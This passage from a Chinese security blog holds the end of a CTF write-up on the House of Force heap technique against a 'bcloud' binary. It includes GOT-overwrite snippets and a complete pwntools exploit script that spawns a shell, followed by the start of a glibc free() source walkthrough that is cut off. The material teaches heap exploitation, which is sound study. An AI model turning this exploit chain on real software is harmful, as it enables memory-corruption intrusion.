<p>&#x6240;&#x4EE5;newNote(0x10,&#x2019;aaaa&#x2019;)&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x7684;&#x64CD;&#x4F5C;&#x4E3A;malloc(0x10+4)&#x5373;malloc(0x14)&#xFF0C;0x14&#x4E0D;&#x662F;8&#x7684;&#x500D;&#x6570;&#xFF0C;&#x901A;&#x8FC7;<code>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</code>&#x8BA1;&#x7B97;&#x771F;&#x6B63;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF0C;&#x800C;glibc&#x4E2D;&#x6E90;&#x7801;&#x6709;&#x4E00;&#x6BB5;&#x6CE8;&#x91CA;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment"> MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&apos;ed area is page</span></span><br><span class="line"><span class="comment">aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br></pre></td></tr></table></figure></p>
<p>&#x6240;&#x4EE5;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x4E3A;<code>((0x14) + 4 + 7) &amp; ~7) = 24</code>&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x52A0;24&#xFF0C;&#x6709;&#x4E86;topchunk&#x7684;&#x6307;&#x9488;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x5230;&#x5E95;&#x8BE5;&#x7533;&#x8BF7;&#x591A;&#x5C11;&#x5185;&#x5B58;&#xFF0C;&#x4F1A;&#x8BA9;topchunk&#x6307;&#x9488;&#x6307;&#x5411;0x804b118</p>
<p><code>malloc_size = -(top_addr-target_addr) - 0x4 -0x8</code>&#xFF0C;&#x7533;&#x8BF7;&#x6B63;&#x7684;size&#x4F1A;&#x62AC;&#x9AD8;topchunk&#x6307;&#x9488;&#xFF0C;&#x53CD;&#x4E4B;&#xFF0C;&#x56E0;&#x6B64;&#x52A0;&#x4E2A;&#x8D1F;&#x53F7;<code>-(top_addr-target_addr)</code></p>
<p>-0x4&#x662F;&#x4E3A;&#x4E86;&#x62B5;&#x6D88;&#x7A0B;&#x5E8F;&#x4E2D;&#x7684;<code>(int)malloc(v2 + 4)</code>&#xFF0C;-0x8&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x65F6;glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5927;&#x5C0F;&#x52A0;&#x4E0A;2*SIZE_SZ&#xFF0C;&#x586B;&#x5145;chunkhead&#x3002;</p>
<h4 id="4-&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;"><a href="#4-&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;" class="headerlink" title="4.&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;"></a>4.&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;</h4><p>&#x901A;&#x8FC7;&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x5806;&#x6307;&#x9488;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x901A;&#x8FC7;editNote&#x51FD;&#x6570;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<p>&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;&#x6253;&#x5370;chunkdata&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x3002;&#x6211;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x5C06;free&#x51FD;&#x6570;&#x4FEE;&#x6539;&#x4E3A;print&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x6253;&#x5370;&#x51FA;chunkdata&#x7684;&#x5185;&#x5BB9;&#x3002;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&apos;free&apos;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">newNote(<span class="number">0x100</span>,payload)</span><br><span class="line">editNote(<span class="number">0</span>,p32(elf.symbols[<span class="string">&apos;printf&apos;</span>]))</span><br><span class="line">deleteNote(<span class="number">1</span>)</span><br><span class="line">atoi_addr = u32(p.recvuntil(<span class="string">&apos;Delete success.&apos;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">log.success(<span class="string">&apos;atoi_addr: &apos;</span>+hex(atoi_addr))</span><br></pre></td></tr></table></figure></p>
<p>&#x7B2C;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x5199;&#x4E3A;free@got&#xFF0C;&#x7B2C;&#x4E8C;&#x7B2C;&#x4E09;&#x5806;&#x6307;&#x9488;&#x5199;&#x4E3A;atoi@got&#xFF0C;&#x5C06;free@got&#x5199;&#x4E3A;print@plt&#xFF0C;<code>deleteNote(1)</code>&#x65F6;&#x4F1A;&#x6253;&#x5370;&#x51FA;atoi&#x5728;libc&#x7684;&#x5730;&#x5740;&#x3002;</p>
<h4 id="5-&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;"><a href="#5-&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;" class="headerlink" title="5.&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;"></a>5.&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">&apos;atoi&apos;</span>]</span><br><span class="line">log.success(<span class="string">&apos;libc_addr: &apos;</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br></pre></td></tr></table></figure>
<p>####6.get shell<br>&#x6709;&#x4E86;system&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x53C8;&#x6709;&#x53EF;&#x63A7;&#x6307;&#x9488;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;atoi@got&#x5199;&#x4E3A;system&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4F20;&#x5165;&#x2019;/bin/sh;&#x2019;&#x5C31;&#x53EF;&#x4EE5;get shell&#x3002;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">editNote(<span class="number">2</span>,p32(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&apos;option---&gt;&gt;&apos;</span>)</span><br><span class="line">p.sendline(<span class="string">&apos;/bin/sh;&apos;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="0x03-&#x603B;&#x7ED3;"><a href="#0x03-&#x603B;&#x7ED3;" class="headerlink" title="0x03 &#x603B;&#x7ED3;"></a>0x03 &#x603B;&#x7ED3;</h3><p>&#x901A;&#x8FC7;&#x4EE5;&#x4E0A;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x51FA;House of Force&#x7684;&#x5229;&#x7528;&#x6761;&#x4EF6;</p>
<ul>
<li>&#x53EF;&#x4EE5;&#x4FEE;&#x6539;topchunk&#x7684;size</li>
<li>malloc(size)&#x4E2D;&#x7684;size&#x53EF;&#x63A7;</li>
</ul>
<h3 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./bcloud&apos;</span>)</span><br><span class="line">elf = ELF(<span class="string">&apos;./bcloud&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc&apos;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context.log_level = <span class="string">&apos;debug&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newNote</span><span class="params">(length,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the length of the note content:&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the content:&apos;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editNote</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the id:&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the new content:\n&apos;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Edit success.&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the id:&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#step1. leak heap address</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input your name:&apos;</span>)</span><br><span class="line">	p.send(<span class="string">&apos;a&apos;</span>*<span class="number">0x38</span>+<span class="string">&apos;b&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;b&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	leakheap_addr = u32(p.read(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step2. set topchunk&apos;s size is -1</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Org:&apos;</span>)</span><br><span class="line">	p.send(<span class="string">&apos;b&apos;</span>*<span class="number">0x40</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Host:&apos;</span>)</span><br><span class="line">	p.send(p32(<span class="number">0xffffffff</span>)+<span class="string">&apos;\n&apos;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step3. alter the topchunk pointer to the target_addr(0x804b118)</span></span><br><span class="line">	note_list = <span class="number">0x804B120</span></span><br><span class="line">        target_addr = note_list - <span class="number">0x8</span></span><br><span class="line">        top_addr = leakheap_addr + <span class="number">0x40</span> + <span class="number">0x48</span> + <span class="number">0x48</span> + <span class="number">24</span></span><br><span class="line">        log.success(<span class="string">&quot;top_addr: &quot;</span>+hex(top_addr))</span><br><span class="line">	malloc_size = -(top_addr-target_addr) - <span class="number">0x4</span> <span class="number">-0x8</span></span><br><span class="line">	log.success(<span class="string">&quot;malloc_size: &quot;</span>+hex(malloc_size))</span><br><span class="line">	newNote(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	newNote(malloc_size,<span class="string">&apos;cccc&apos;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">#step4. leak atoi_addr</span></span><br><span class="line">	payload = p32(elf.got[<span class="string">&apos;free&apos;</span>])</span><br><span class="line">	payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">	payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">	newNote(<span class="number">0x100</span>,payload)</span><br><span class="line">	editNote(<span class="number">0</span>,p32(elf.symbols[<span class="string">&apos;printf&apos;</span>]))</span><br><span class="line">	deleteNote(<span class="number">1</span>)</span><br><span class="line">	atoi_addr = u32(p.recvuntil(<span class="string">&apos;Delete success.&apos;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">	log.success(<span class="string">&apos;atoi_addr: &apos;</span>+hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step5. calc system_addr</span></span><br><span class="line">	libc_base = atoi_addr - libc.symbols[<span class="string">&apos;atoi&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;libc_addr: &apos;</span>+hex(libc_base))</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step6. get shell</span></span><br><span class="line">	editNote(<span class="number">2</span>,p32(system_addr))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;option---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;/bin/sh;&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/10/libc源码分析-chunk的释放/">libc源码分析-chunk的释放</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-10</time><div class="content"><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="_libc_free"></a>_libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">{</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    {</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    {</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">         Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">          &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        {</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        }</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ free ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">{</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  <span class="comment">/* Little security check which won&apos;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="comment">/*&#x68C0;&#x67E5;chunk&#x7684;size&#x662F;&#x5426;&#x6EE1;&#x8DB3;&#x5927;&#x5C0F;&#x4E14;&#x5BF9;&#x9F50;*/</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*&#x68C0;&#x67E5;&#x4E0B;&#x4E2A;chunk&#x7684;PREV_INUSE(lsb)&#x4F4D;,&#x5224;&#x65AD;&#x5F53;&#x524D;chunk&#x662F;&#x5426;&#x88AB;&#x4F7F;&#x7528;,&#x4F46;&#x662F;&#x5728;&#x91CA;&#x653E;fastchunk&#x65F6;,&#x8BE5;&#x4F4D;&#x4F1A;&#x88AB;&#x5FFD;&#x7565;*/</span>  </span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      {</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      }</span><br><span class="line">  }</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">    &#x5224;&#x65AD;chunk&#x7684;size&#x662F;&#x5426;&#x6EE1;&#x8DB3;fastchunk&#x7684;&#x5927;&#x5C0F;(64 bytes on x32, 128 bytes on x64)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If TRIM_FASTBINS set, don&apos;t place chunks</span></span><br><span class="line"><span class="comment">        bordering top into fastbins</span></span><br><span class="line"><span class="comment">        &#x8BE5;&#x53D8;&#x91CF;&#x9ED8;&#x8BA4;&#x4E3A;0</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span 